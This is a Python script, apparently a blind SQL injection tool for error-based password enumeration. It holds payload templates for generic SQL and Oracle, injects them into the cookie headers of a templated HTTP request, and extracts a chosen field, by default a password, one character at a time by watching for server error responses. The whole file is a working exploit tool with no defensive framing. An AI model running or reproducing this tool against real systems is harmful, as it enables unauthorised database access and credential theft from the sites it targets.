import email
from io import BytesIO
from http.server import BaseHTTPRequestHandler
import argparse
import io
from operator import index
from pprint import pprint
import sys
from typing import Literal
from urllib import response
import requests

from distutils.log import error
from ast import arg
from string import Template

parser = argparse.ArgumentParser("password_enum")

parser.add_argument(
    "--type", help="The type of Blind Injection to use. Currently only conditional errors are supported...", type=str, default='error')
parser.add_argument(
    "--template", help="The request template used to contain the injection code.", type=str, default='template.txt')
parser.add_argument(
    "--wordlist", help="The wordlist used for payloads", type=str, default="wordlists/atob0to9.txt")
parser.add_argument(
    "--ssl", help="The wordlist used for payloads", action=argparse.BooleanOptionalAction)
parser.add_argument(
    "--success", help="The phrase used to mark a SQL error has been thrown", type=str, default="Internal Server Error")

parser.add_argument(
    "table", help="The table containing the information to enumerate.", type=str)
parser.add_argument(
    "columnName", help="The column name used to match a record to enumerate.", type=str)
parser.add_argument(
    "columnValue", help="The column value used to match a record to enumerate.", type=str)
parser.add_argument(
    "fieldName", help="The field to enumerate.", type=str)

# Settings
MARKER = '[[INJECTION_POINT]]'
FIELD_LENGTH_LIMIT = 50

# SQL Commands
SQL = {
    'error': {
        'BASIC': "' || (SELECT '') || '",
        'TABLE_CHECK': "' || (SELECT '' FROM $tableName) || '",
        'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'",
        'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH($fieldName)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'",
        'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTRING($fieldName, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'"
    }
}
ORACLE = {
    'error': {
        'BASIC': "' || (SELECT '' from dual) || '",
        'TABLE_CHECK': "' || (SELECT '' FROM $tableName WHERE ROWNUM = 1) || '",
        'COLUMN_CHECK': "' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'",
        'LENGTH_CHECK': "' || (SELECT CASE WHEN LENGTH($fieldName)=$lengthTndex THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'",
        'VALUE_CHECK': "' || (SELECT CASE WHEN SUBSTR($fieldName, $currentIndex, 1)='$currentValue' THEN TO_CHAR(1/0) ELSE '' END FROM $tableName WHERE $columnName='$columnValue')||'"
    }
}

args = parser.parse_args()

tableName = args.table
columnName = args.columnName
columnValue = args.columnValue
fieldName = args.fieldName

try:
    wlFile = open(args.wordlist, "r")
except FileNotFoundError:
    error("Wordlist does not exist!")
else:
    values = wlFile.read()
    payloadValues = values.split('\n')
    wlFile.close()

try:
    templateFile = open(args.template, "r")
except FileNotFoundError:
    error("Template does not exist!")
    template = ''
else:
    template = templateFile.read()
    templateFile.close()

request_line, headers_alone = template.split('\n', 1)

message = email.message_from_file(io.StringIO(headers_alone))
protocol = "https://" if args.ssl else "http://"
headers = dict(message.items())
url = f"{protocol}{headers['Host']}{request_line.replace('GET ', '').replace(' HTTP/1.1', '')}"
dbVersion = "UNKNOWN"

field_length = 0
current_value = ""
current_index = 0
enumerated_value = ""
indexes: list[int] = []


def isSqlCompatible() -> bool:
    global dbVersion
    print("Checking SQL is being used")

    inject(SQL[args.type]["BASIC"], False)
    if not executeRequestAndReturnsError():
        dbVersion = "SQL"
        return True

    inject(ORACLE[args.type]["BASIC"], False)
    if not executeRequestAndReturnsError():
        dbVersion = "ORACLE"
        return True

    return False


def getSQLCommand(key) -> str:
    match dbVersion:
        case "SQL":
            return SQL[args.type][key]
        case "ORACLE":
            return ORACLE[args.type][key]
        case _:
            print(f"Unknow database version detected, exiting as this is not supported.")
            sys.exit()


def checkTableExists(tableName) -> bool:
    print("Checking table exists")
    inject("TABLE_CHECK")

    return False if executeRequestAndReturnsError() else True


def checkRowExists(tableName, columnName, columnValue) -> bool:
    print("Checking row exists")
    inject("COLUMN_CHECK")

    return False if executeRequestAndReturnsError() else True


def enumerateFieldLength(tableName, columnName, columnValue) -> bool:
    global field_length

    print("Getting field length...")

    for x in range(FIELD_LENGTH_LIMIT):
        field_length = x

        inject("LENGTH_CHECK")

        if executeRequestAndReturnsError():
            print(f"{fieldName} has a length of {field_length}\n")
            return True

    return False


def enumerateFieldValue(tableName, columnName, columnValue) -> None:
    global field_length
    global current_index
    global current_value
    global enumerated_value

    print("Enumerating field values...")

    for x in range(field_length):
        current_index = x+1

        for val in payloadValues:
            current_value = val

            inject("VALUE_CHECK")

            if executeRequestAndReturnsError():
                enumerated_value += val
                print(f"{fieldName}({current_index}) = {enumerated_value}")
                break


def inject(sqlKey, autolookup=True) -> None:
    global headers

    orgSql: str = getSQLCommand(sqlKey) if autolookup else sqlKey
    sql: Template = Template(orgSql)

    safeSql: str = sql.safe_substitute(
        tableName=tableName, columnName=columnName, columnValue=columnValue, fieldName=fieldName, lengthTndex=field_length, currentIndex=current_index, currentValue=current_value)

    for header, value in message.items():
        if MARKER in value:
            headers[header] = value.replace(MARKER, safeSql)


# Returns TRUE if success string is found in response.text
def executeRequestAndReturnsError() -> bool:
    cookies = dict()
    orgCookies = headers['Cookie'].split(';')

    for cookie in orgCookies:
        orgCookieValues = cookie.split("=", 1)
        cookies.update({orgCookieValues[0]: orgCookieValues[1]})
    response = requests.get(url, cookies=cookies)

    # print(f"Sending: {cookies}")
    # result: bool = args.success in response.text
    # print(f"SQL Error Thrown? {result}")
    return args.success in response.text


if not isSqlCompatible():
    print(f"{url} appears to not be processing commands as SQL")
    sys.exit()
else:
    print("SQL seems supported! \n")

if not checkTableExists(tableName):
    print(f"Table {tableName} does not exist!")
    sys.exit()
else:
    print(f"{tableName} is present! \n")

if not checkRowExists(tableName, columnName, columnValue):
    print(
        f"Then entry with identifer {columnName} does not exist with a value of {columnValue}!")
    sys.exit()
else:
    print(f"Found entry matching {columnName}={columnValue}\n")

enumerateFieldLength(tableName, columnName, columnValue)
enumerateFieldValue(tableName, columnName, columnValue)
